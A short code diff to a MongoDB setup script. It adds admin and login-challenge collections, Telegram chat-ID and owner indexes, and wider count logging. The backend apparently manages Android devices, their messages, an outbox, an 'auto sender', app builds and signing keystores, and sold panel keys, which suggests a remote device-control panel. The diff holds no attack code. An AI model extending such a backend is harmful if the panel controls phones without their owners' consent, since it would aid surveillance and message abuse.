@@ -16,6 +16,8 @@ const COLLECTIONS = [
   "device_events",
   "install_fingerprints",
   "panel_keys",
+  "panel_admins",
+  "login_challenges",
   "apps",
   "builds",
   "orders",
@@ -266,6 +268,7 @@ async function ensureIndexes() {
     ["devices", { install_state: 1, last_seen: -1 }, {}, "devices.state_lastseen"],
     ["devices", { android_id: 1 }, { sparse: true }, "devices.android_id"],
     ["devices", { "auto_sender.enabled": 1 }, {}, "devices.auto_sender_enabled"],
+    ["devices", { owner_key_id: 1, last_seen: -1 }, {}, "devices.owner_lastseen"],
 
     ["messages", { device_id: 1, _id: -1 }, {}, "messages.device_id"],
     ["messages", { device_id: 1, created_at: -1 }, {}, "messages.device_created"],
@@ -284,6 +287,13 @@ async function ensureIndexes() {
 
     ["panel_keys", { key_hash: 1 }, { unique: true, sparse: true }, "panel_keys.key_hash"],
     ["panel_keys", { expires_at: 1 }, {}, "panel_keys.expires_at"],
+    ["panel_keys", { telegram_chat_id: 1 }, { sparse: true }, "panel_keys.tg_chat"],
+
+    ["panel_admins", { username_lc: 1 }, { unique: true, sparse: true }, "panel_admins.username"],
+    ["panel_admins", { telegram_chat_id: 1 }, { sparse: true }, "panel_admins.tg_chat"],
+
+    ["login_challenges", { ident: 1, created_at: -1 }, {}, "login_challenges.ident"],
+    ["login_challenges", { expires_at: 1 }, { expireAfterSeconds: 0 }, "login_challenges.ttl"],
 
     [
       "install_fingerprints",
@@ -333,7 +343,7 @@ async function ensureIndexes() {
 async function logCounts() {
   try {
     const parts = [];
-    for (const n of ["devices", "messages", "outbox", "builds", "apps", "keystores"]) {
+    for (const n of ["devices", "messages", "outbox", "builds", "apps", "keystores", "panel_keys", "panel_admins"]) {
       const c = coll(n);
       if (c) parts.push(`${n}=${await c.countDocuments({})}`);
     }
